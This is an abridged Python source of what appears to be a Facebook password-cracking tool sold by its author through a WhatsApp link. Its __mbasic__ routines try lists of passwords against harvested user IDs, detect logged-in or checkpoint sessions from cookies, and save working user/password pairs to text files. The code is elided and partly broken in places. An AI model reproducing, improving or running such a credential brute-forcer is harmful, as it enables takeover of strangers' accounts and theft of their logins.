...
def main_apv():
  ...
  try: 
    httpCaht = requests.get("https://github.com/arafat-mahin310/aprv.txt.git").text 
    if id in httpCaht: 
      ...
      os.system('xdg-open https://wa.me/+8801925798757?text=Hello%2C%20MUGHAL%20I%20want%20to%20buy%20your%20command')
      time.sleep(3) 
      sys.exit() 
  except: 
    sys.exit() 
...
def main():
    ...
    if CracKing in ('0', '00'):
        exit('THANKS FOR USING Arafat Bin Mahin TOOL')
    if CracKing in ('8', '08'):
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;37m[\033[1;32mArafat-mahin😳-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('ok.txt','a').write('%s\n' % wrt)
				break
			elif 'checkpoint' in ses.cookies.get_dict():
				print('\r\033[1;31m[\033[1;30mArafat-mahin😳-CP\033[1;31m]\033[1;30m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('Arafat-mahin😳_Ok.txt','a').write('%s\n' % wrt)
				break
			elif 'checkpoint' in ses.cookies.get_dict():
				try:
					...
					month = bulan_ttl[month].print('\r\033[1;91m[Arafat-mahin😳-CP] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('Arafat-mahin😳_Cp.txt','a').write('%s\n' % wrt)
					break
				except (KeyError, IOError):
					month = ''
					day   = ''
					...
					pass
				print('\r\033[1;91m[Arafat-mahin😳-CP] %s | %s%s      ' % (user,pw,tahun(user)))
...
def publiccrack():
    ...
    os.system('clear')
    print(banner)
    os.system('rm -rf .Arafat-mahin😳1.txt')
    os.system('rm -rf .Arafat-mahin😳2.txt')
...
def create_file():
    ...
    for fir in range(limit_user):
        ...
        try:
            ...
            qfr = json.loads(fr)
            temp_save = open('.Arafat-mahin😳1.txt', 'a')
    ...
    for links in range(ask_link):
        completed +=1
        li = ('1')
        os.system('cat .Arafat-mahin😳1.txt | grep '+li+' >> .Arafat-mahin😳2.txt')
    ...
    version()
if not os.path.exists(".Arafat-mahin😳work.txt"):
	open(".Arafat-mahin😳work.txt", 'w').close()
class load:
    def __init__(self):
        _ = ''
        __ = int('30')
...
def separate():
    ...
    if file_name == '':
        main_menu()
    print ('\033[1;32mFor Example /sdcard/dada.txt\033[0;97m')
    print (47*'-')
...
banner = """
  ...
  \33[0;92m└─────────────────────────────────────────────────────────┘  \033                                     
\33[0;92m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
\33[0;92m█  \32Author  :\033[0;99m 𝓜𝓪𝓱𝓲𝓷
\33[0;92m█  \32Facebook: \033[0;97mArafat Mahin
